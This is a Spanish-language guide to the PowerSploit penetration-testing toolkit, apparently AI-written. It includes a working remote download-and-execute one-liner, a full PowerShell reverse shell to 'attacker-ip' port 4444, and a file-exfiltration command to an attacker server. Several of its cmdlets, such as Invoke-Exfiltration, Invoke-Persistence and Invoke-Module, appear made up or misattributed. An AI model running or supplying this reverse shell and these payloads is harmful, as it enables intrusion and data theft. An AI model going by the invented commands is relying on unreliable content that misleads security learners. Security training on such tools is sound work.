#Pentest  

PowerSploit es una colección de scripts y módulos de PowerShell diseñados para pruebas de penetración y auditoría de seguridad. Aquí tienes una guía básica para comenzar con PowerSploit:

### 1. **Introducción a PowerSploit**
   - **Qué es PowerSploit:** Un conjunto de herramientas y scripts en PowerShell para realizar pruebas de seguridad y auditoría. Se utiliza principalmente en entornos de pruebas controladas.

### 2. **Instalación de PowerSploit**
   - **Clonación del Repositorio:**
     ```powershell
     git clone https://github.com/PowerShellMafia/PowerSploit.git
     ```
   - **Importación del Módulo:**
     ```powershell
     Import-Module .\PowerSploit\PowerSploit.psd1
     ```

### 3. **Uso Básico de PowerSploit**
   - **Ejecutar un Script:**
     ```powershell
     .\PowerSploit\Exfiltration\Out-File -Path "C:\path\to\file.txt" -Content "Texto de ejemplo"
     ```
   - **Ejecutar un Módulo:**
     ```powershell
     Invoke-Module -Name ModuleName
     ```

### 4. **Módulos Principales de PowerSploit**
   - **Exfiltration:**
     - **Exfiltrar Datos:** Envía datos desde la máquina víctima a un servidor atacante.
     - Ejemplo:
       ```powershell
       Invoke-Exfiltration -Path "C:\important_file.txt" -Destination "http://attacker-ip:port"
       ```
   - **Privesc (Escalada de Privilegios):**
     - **Escalar Privilegios:** Buscar y aprovechar configuraciones que permitan la elevación de privilegios.
     - Ejemplo:
       ```powershell
       Invoke-PrivescCheck
       ```
   - **Persistence (Persistencia):**
     - **Mantener Acceso:** Configurar scripts o tareas programadas para mantener acceso a largo plazo.
     - Ejemplo:
       ```powershell
       Invoke-Persistence -Path "C:\path\to\script.ps1"
       ```

### 5. **Ejemplos de Uso Común**
   - **Ejecución de Comandos Remotos:**
     ```powershell
     Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker-ip/malicious.ps1')
     ```
   - **Shell Reverso:**
     ```powershell
     $client = New-Object System.Net.Sockets.TCPClient("attacker-ip", 4444)
     $stream = $client.GetStream()
     $writer = New-Object System.IO.StreamWriter($stream)
     $reader = New-Object System.IO.StreamReader($stream)
     $writer.AutoFlush = $true
     while ($true) {
         $command = $reader.ReadLine()
         if ($command -ne $null) {
             $result = Invoke-Expression $command 2>&1
             $writer.WriteLine($result)
         }
     }
     ```

### 6. **Defensas y Contramedidas**
   - **Auditoría de Scripts:** Revisar y auditar los scripts y actividades realizadas.
   - **Políticas de Seguridad:** Implementar políticas que limiten la ejecución de scripts no autorizados.
   - **Herramientas de Seguridad:** Utilizar antivirus y sistemas de detección de intrusiones.

### 7. **Referencias y Recursos Adicionales**
   - **Repositorio de PowerSploit en GitHub:** [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
   - **Documentación de PowerShell:** [Documentación Oficial](https://docs.microsoft.com/en-us/powershell/)

Esta guía te proporciona un punto de partida para trabajar con PowerSploit, pero siempre es fundamental realizar pruebas en un entorno controlado y con permiso adecuado. Si necesitas más información o detalles específicos, no dudes en preguntar.